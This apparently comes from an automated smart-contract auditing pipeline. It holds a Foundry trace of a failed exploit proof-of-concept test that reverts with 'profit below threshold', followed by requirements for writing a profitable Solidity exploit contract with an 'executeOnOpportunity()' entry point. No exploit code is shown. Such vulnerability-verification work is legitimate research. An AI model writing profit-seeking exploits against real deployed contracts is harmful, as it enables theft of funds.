    │   │   ├─ [500] 0x33e690aEa97E4Ef25F0d140F1bf044d663091DAf::communityVault() [delegatecall]
    │   │   │   └─ ← [Return] 0xEB890541049CCd965D3DD4a3Ec1aD368FD4B26A4
    │   │   └─ ← [Return] 0xEB890541049CCd965D3DD4a3Ec1aD368FD4B26A4
    │   ├─ [479] 0xEB890541049CCd965D3DD4a3Ec1aD368FD4B26A4::wrappedNativeToken() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xEB890541049CCd965D3DD4a3Ec1aD368FD4B26A4) [staticcall]
    │   │   └─ ← [Return] 2800000000000000000 [2.8e18]
    │   ├─ [677] 0x6B175474E89094C44Da98b954EedeAC495271d0F::allowance(0xEB890541049CCd965D3DD4a3Ec1aD368FD4B26A4, 0xDE62E1b0edAa55aAc5ffBE21984D321706418024) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0x5DB6E1b7CE743a2D49B2546B3ebE17132E0Ab04d) [staticcall]
    │   │   └─ ← [Return] 67919260568811602527 [6.791e19]
    │   ├─ [677] 0x6B175474E89094C44Da98b954EedeAC495271d0F::allowance(0x5DB6E1b7CE743a2D49B2546B3ebE17132E0Ab04d, 0xDE62E1b0edAa55aAc5ffBE21984D321706418024) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0x5DB6E1b7CE743a2D49B2546B3ebE17132E0Ab04d) [staticcall]
    │   │   └─ ← [Return] 67919260568811602527 [6.791e19]
    │   ├─ [677] 0x6B175474E89094C44Da98b954EedeAC495271d0F::allowance(0x5DB6E1b7CE743a2D49B2546B3ebE17132E0Ab04d, 0xDE62E1b0edAa55aAc5ffBE21984D321706418024) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2645] 0xEB890541049CCd965D3DD4a3Ec1aD368FD4B26A4::isFeeTokenAllowed(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599) [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [2645] 0xEB890541049CCd965D3DD4a3Ec1aD368FD4B26A4::isFeeTokenAllowed(0x853d955aCEf822Db058eb8505911ED77F175b99e) [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [2645] 0xEB890541049CCd965D3DD4a3Ec1aD368FD4B26A4::isFeeTokenAllowed(0x5f98805A4E8be255a32880FDeC7F6728C6568bA0) [staticcall]
    │   │   └─ ← [Return] false
    │   └─ ← [Return]
    ├─ [318] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [341] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.69s (2.66s CPU time)

Ran 1 test suite in 2.72s (2.69s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 635740)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
